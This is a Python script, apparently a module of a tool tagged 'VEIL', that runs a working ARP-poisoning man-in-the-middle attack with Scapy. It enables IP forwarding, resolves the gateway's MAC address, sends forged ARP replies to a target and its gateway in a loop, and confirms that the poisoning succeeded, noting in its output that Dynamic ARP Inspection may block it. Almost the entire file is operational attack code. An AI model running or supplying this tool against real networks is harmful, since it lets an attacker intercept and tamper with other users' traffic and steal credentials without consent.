# ARP poisoning sends forged ARP replies to both peers in a conversation:
# - To the target: "gateway_ip is at attacker_mac"
# - To the gateway: "target_ip is at attacker_mac"
# Both peers update ARP caches, causing traffic to route through this machine.
# IP forwarding must be enabled or the target loses internet connectivity.

import os
import time

from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp


IP_FORWARD_PATH = os.path.join(os.sep, "proc", "sys", "net", "ipv4", "ip_forward")


def enable_forwarding() -> None:
    try:
        with open(IP_FORWARD_PATH, "w", encoding="utf-8") as forward_file:
            forward_file.write("1")
        print("IP forwarding enabled.")
    except IOError as exc:
        print(f"Warning: failed to enable IP forwarding: {exc}")


def disable_forwarding() -> None:
    try:
        with open(IP_FORWARD_PATH, "w", encoding="utf-8") as forward_file:
            forward_file.write("0")
        print("IP forwarding disabled.")
    except IOError as exc:
        print(f"Warning: failed to disable IP forwarding: {exc}")


def _build_arp_reply(
    sender_ip: str, sender_mac: str, target_ip: str, target_mac: str
):
    return Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=sender_ip,
        hwsrc=sender_mac,
    )


def get_attacker_mac(interface: str) -> str:
    try:
        return get_if_hwaddr(interface)
    except Exception as exc:
        raise RuntimeError(
            f"Failed to resolve attacker MAC on interface '{interface}': {exc}"
        ) from exc


def get_gateway_mac(gateway_ip: str, interface: str) -> str:
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=gateway_ip)

    try:
        answered, _ = srp(request, iface=interface, timeout=3, verbose=0)
    except Exception as exc:
        raise RuntimeError(
            f"Failed to resolve gateway MAC for '{gateway_ip}' on '{interface}': {exc}"
        ) from exc

    if not answered:
        raise RuntimeError(
            f"No ARP response from gateway '{gateway_ip}' on interface '{interface}'."
        )

    return answered[0][1].hwsrc


def verify_poison(target_ip: str, gateway_ip: str, interface: str) -> bool:
    attacker_mac = get_if_hwaddr(interface)
    verify_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=1,
        pdst=gateway_ip,
        psrc=target_ip,
    )
    answered, _ = srp(verify_request, iface=interface, timeout=2, verbose=0)

    if not answered:
        print("[VEIL] ✗ No ARP response from target — host may be offline.")
        return False

    reported_mac = None
    for _, response in answered:
        if response.haslayer(ARP) and response[ARP].psrc == gateway_ip:
            reported_mac = response[ARP].hwsrc
            break

    if reported_mac is None:
        print("[VEIL] ✗ No ARP response from target — host may be offline.")
        return False

    if reported_mac.lower() == attacker_mac.lower():
        print(f"[VEIL] ✓ Poison confirmed on {target_ip}")
        return True

    print("[VEIL] ✗ Poison unconfirmed — target ARP cache unchanged. DAI may be active.")
    return False


def start_poisoning(
    interface: str,
    gateway_ip: str,
    gateway_mac: str,
    target_ip: str,
    target_mac: str,
    interval: int = 2,
) -> None:
    attacker_mac = get_attacker_mac(interface)
    poison_confirmed = False
    verification_done = False

    while True:
        target_packet = _build_arp_reply(
            sender_ip=gateway_ip,
            sender_mac=attacker_mac,
            target_ip=target_ip,
            target_mac=target_mac,
        )
        gateway_packet = _build_arp_reply(
            sender_ip=target_ip,
            sender_mac=attacker_mac,
            target_ip=gateway_ip,
            target_mac=gateway_mac,
        )

        sendp(target_packet, iface=interface, verbose=0)
        sendp(gateway_packet, iface=interface, verbose=0)
        if not verification_done:
            poison_confirmed = verify_poison(target_ip, gateway_ip, interface)
            verification_done = True
        print(f"\u2192 Poisoning: [{target_ip}] \u2194 [{gateway_ip}]  (Ctrl+C to stop)")
        time.sleep(interval)